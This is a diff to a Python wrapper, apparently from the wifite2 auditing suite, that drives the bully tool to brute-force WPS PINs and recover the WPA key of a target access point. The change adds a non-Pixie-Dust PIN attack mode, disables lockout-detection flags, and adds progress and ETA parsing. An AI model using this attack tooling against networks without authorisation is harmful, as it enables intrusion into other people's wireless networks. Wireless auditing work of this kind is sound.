@@ -18,18 +18,24 @@ class Bully(Attack, Dependency):
     dependency_name = 'bully'
     dependency_url = 'https://github.com/aanarchyy/bully'
 
-    def __init__(self, target):
+    def __init__(self, target, pixie_dust=True):
         super(Bully, self).__init__(target)
+
+        self.target = target
+        self.pixie_dust = pixie_dust
+
+        self.total_attempts = 0
         self.total_timeouts = 0
         self.total_failures = 0
         self.locked = False
         self.state = '{O}Waiting for beacon{W}'
         self.start_time = time.time()
+        self.last_pin = ""
+        self.pins_remaining = -1
+        self.eta = ''
 
         self.cracked_pin = self.cracked_key = self.cracked_bssid = self.cracked_essid = None
         self.crack_result = None
-
-        self.target = target
 
         self.cmd = []
 
@@ -42,12 +48,14 @@ class Bully(Attack, Dependency):
             'bully',
             '--bssid', target.bssid,
             '--channel', target.channel,
-            '--detectlock', # Detect WPS lockouts unreported by AP
-            '--force',
+            #'--detectlock', # Detect WPS lockouts unreported by AP
+            #'--force',
             '-v', '4',
-            '--pixiewps',
             Configuration.interface
         ])
+
+        if self.pixie_dust:
+            self.cmd.insert(-1, '--pixiewps')
 
         self.bully_proc = None
 
@@ -73,36 +81,7 @@ class Bully(Attack, Dependency):
             t.start()
 
             try:
-                while self.bully_proc.poll() is None:
-                    try:
-                        self.target = self.wait_for_target(airodump)
-                    except Exception as e:
-                        self.pattack('{R}Failed: {O}%s{W}' % e, newline=True)
-                        self.stop()
-                        break
-
-                    # Update status
-                    self.pattack(self.get_status())
-
-                    # Check if entire attack timed out.
-                    if self.running_time() > Configuration.wps_pixie_timeout:
-                        self.pattack('{R}Failed: {O}Timeout after %d seconds{W}' % Configuration.wps_pixie_timeout, newline=True)
-                        self.stop()
-                        return
-
-                    # Check if timeout threshold was breached
-                    if self.total_timeouts >= Configuration.wps_timeout_threshold:
-                        self.pattack('{R}Failed: {O}More than %d timeouts{W}' % Configuration.wps_timeout_threshold, newline=True)
-                        self.stop()
-                        return
-
-                    # Check if WPSFail threshold was breached
-                    if self.total_failures >= Configuration.wps_fail_threshold:
-                        self.pattack('{R}Failed: {O}More than %d WPSFails{W}' % Configuration.wps_fail_threshold, newline=True)
-                        self.stop()
-                        return
-
-                    time.sleep(0.5)
+                self._run(airodump)
             except KeyboardInterrupt as e:
                 self.stop()
                 raise e
@@ -113,16 +92,70 @@ class Bully(Attack, Dependency):
         if self.crack_result is None:
             self.pattack('{R}Failed{W}', newline=True)
 
+    def _run(self, airodump):
+        while self.bully_proc.poll() is None:
+            try:
+                self.target = self.wait_for_target(airodump)
+            except Exception as e:
+                self.pattack('{R}Failed: {O}%s{W}' % e, newline=True)
+                Color.pexception(e)
+                self.stop()
+                break
+
+            # Update status
+            self.pattack(self.get_status())
+
+                # Thresholds only apply to Pixie-Dust
+            if self.pixie_dust:
+                # Check if entire attack timed out.
+                if self.running_time() > Configuration.wps_pixie_timeout:
+                    self.pattack('{R}Failed: {O}Timeout after %d seconds{W}' % (
+                        Configuration.wps_pixie_timeout), newline=True)
+                    self.stop()
+                    return
+
+                # Check if timeout threshold was breached
+                if self.total_timeouts >= Configuration.wps_timeout_threshold:
+                    self.pattack('{R}Failed: {O}More than %d Timeouts{W}' % (
+                        Configuration.wps_timeout_threshold), newline=True)
+                    self.stop()
+                    return
+
+                # Check if WPSFail threshold was breached
+                if self.total_failures >= Configuration.wps_fail_threshold:
+                    self.pattack('{R}Failed: {O}More than %d WPSFails{W}' % (
+                        Configuration.wps_fail_threshold), newline=True)
+                    self.stop()
+                    return
+
+            time.sleep(0.5)
+
 
     def pattack(self, message, newline=False):
         # Print message with attack information.
-        time_left = Configuration.wps_pixie_timeout - self.running_time()
+        if self.pixie_dust:
+            # Count down
+            time_left = Configuration.wps_pixie_timeout - self.running_time()
+            attack_name = 'Pixie-Dust'
+        else:
+            # Count up
+            time_left = self.running_time()
+            attack_name = 'PIN Attack'
+
+        if self.eta:
+            time_msg = '{D}ETA:{W}{C}%s{W}' % self.eta
+        else:
+            time_msg = '{C}%s{W}' % Timer.secs_to_str(time_left)
+
+        if self.pins_remaining >= 0:
+            time_msg += ', {D}PINs Left:{W}{C}%d{W}' % self.pins_remaining
+        else:
+            time_msg += ', {D}PINs:{W}{C}%d{W}' % self.total_attempts
 
         Color.clear_entire_line()
-        Color.pattack('WPS',
-                self.target,
-                'Pixie-Dust',
-                '{W}[{C}%s{W}] %s' % (Timer.secs_to_str(time_left), message))
+        Color.pattack('WPS', self.target, attack_name,
+                '{W}[%s] %s' % (time_msg, message))
+
         if newline:
             Color.pl('')
 
@@ -139,7 +172,7 @@ class Bully(Attack, Dependency):
             meta_statuses.append('{O}Timeouts:%d{W}' % self.total_timeouts)
 
         if self.total_failures > 0:
-            meta_statuses.append('{O}WPSFail:%d{W}' % self.total_failures)
+            meta_statuses.append('{O}Fails:%d{W}' % self.total_failures)
 
         if self.locked:
             meta_statuses.append('{R}Locked{W}')
@@ -153,6 +186,7 @@ class Bully(Attack, Dependency):
     def parse_line_thread(self):
         for line in iter(self.bully_proc.pid.stdout.readline, b''):
             if line == '': continue
+            line = line.decode('utf-8')
             line = line.replace('\r', '').replace('\n', '').strip()
 
             if Configuration.verbose > 1:
@@ -191,7 +225,7 @@ class Bully(Attack, Dependency):
                 # Mention the PIN & that we're not done yet.
                 self.pattack('{G}Cracked PIN: {C}%s{W}' % self.cracked_pin, newline=True)
 
-                self.state = '{G}Finding PSK...{C}'
+                self.state = '{G}Finding Key...{C}'
                 time.sleep(2)
 
         ###########################
@@ -201,7 +235,7 @@ class Bully(Attack, Dependency):
             self.cracked_key = key_re.group(1)
 
         if not self.crack_result and self.cracked_pin and self.cracked_key:
-            self.pattack('{G}Cracked PSK: {C}%s{W}' % self.cracked_key, newline=True)
+            self.pattack('{G}Cracked Key: {C}%s{W}' % self.cracked_key, newline=True)
             self.crack_result = CrackResultWPS(
                     self.target.bssid,
                     self.target.essid,
@@ -225,20 +259,33 @@ class Bully(Attack, Dependency):
         # [+] Last State = 'NoAssoc'   Next pin '48855501'
         last_state = re.search(r".*Last State = '(.*)'\s*Next pin '(.*)'", line)
         if last_state:
-            # group(1)=result, group(2)=PIN
+            # group(1)=NoAssoc, group(2)=PIN
             pin = last_state.group(2)
-            state = 'Trying PIN {C}%s{W} (%s)' % (pin, last_state.group(1))
+            if pin != self.last_pin:
+                self.last_pin = pin
+                self.total_attempts += 1
+                if self.pins_remaining > 0:
+                    self.pins_remaining -= 1
+            state = 'Trying PIN'
 
         # [+] Tx( Auth ) = 'Timeout'   Next pin '80241263'
-        mx_result_pin = re.search(r".*[RT]x\(\s*(.*)\s*\) = '(.*)'\s*Next pin '(.*)'", line)
+        mx_result_pin = re.search(
+                r".*[RT]x\(\s*(.*)\s*\) = '(.*)'\s*Next pin '(.*)'", line)
         if mx_result_pin:
+            # group(1)=M1,M2,..,M7, group(2)=result, group(3)=Next PIN
             self.locked = False
-            # group(1)=M3/M5, group(2)=result, group(3)=PIN
             m_state = mx_result_pin.group(1)
-            result = mx_result_pin.group(2) # NoAssoc, WPSFail, Pin1Bad, Pin2Bad
+            result = mx_result_pin.group(2)  # NoAssoc, WPSFail, Pin1Bad, Pin2Bad
             pin = mx_result_pin.group(3)
+            if pin != self.last_pin:
+                self.last_pin = pin
+                self.total_attempts += 1
+                if self.pins_remaining > 0:
+                    self.pins_remaining -= 1
 
-            if result == 'Timeout':
+            if result in ['Pin1Bad', 'Pin2Bad']:
+                result = '{G}%s{W}' % result
+            elif result == 'Timeout':
                 self.total_timeouts += 1
                 result = '{O}%s{W}' % result
             elif result == 'WPSFail':
@@ -250,14 +297,33 @@ class Bully(Attack, Dependency):
                 result = '{R}%s{W}' % result
 
             result = '{P}%s{W}:%s' % (m_state.strip(), result.strip())
-            state = 'Trying PIN {C}%s{W} (%s)' % (pin, result)
+            state = 'Trying PIN (%s)' % result
+
+        # [!] Run time 00:02:49, pins tested 32 (5.28 seconds per pin)
+        re_tested = re.search(r'Run time ([0-9:]+), pins tested ([0-9])+', line)
+        if re_tested:
+            # group(1)=01:23:45, group(2)=1234
+            self.total_attempts = int(re_tested.group(2))
+
+        #[!] Current rate 5.28 seconds per pin, 07362 pins remaining
+        re_remaining = re.search(r' ([0-9]+) pins remaining', line)
+        if re_remaining:
+            self.pins_remaining = int(re_remaining.group(1))
+
+        # [!] Average time to crack is 5 hours, 23 minutes, 55 seconds
+        re_eta = re.search(
+                r'time to crack is (\d+) hours, (\d+) minutes, (\d+) seconds', line)
+        if re_eta:
+            h, m, s = re_eta.groups()
+            self.eta = '%sh%sm%ss' % (
+                    h.rjust(2, '0'), m.rjust(2, '0'), s.rjust(2, '0'))
 
         # [!] WPS lockout reported, sleeping for 43 seconds ...
         re_lockout = re.search(r".*WPS lockout reported, sleeping for (\d+) seconds", line)
         if re_lockout:
             self.locked = True
             sleeping = re_lockout.group(1)
-            state = '{R}WPS Lock-out: {O}Waiting %s seconds{W}' % sleeping
+            state = '{R}WPS Lock-out: {O}Waiting %s seconds...{W}' % sleeping
 
         # [Pixie-Dust] WPS pin not found
         re_pin_not_found = re.search(r".*\[Pixie-Dust\] WPS pin not found", line)
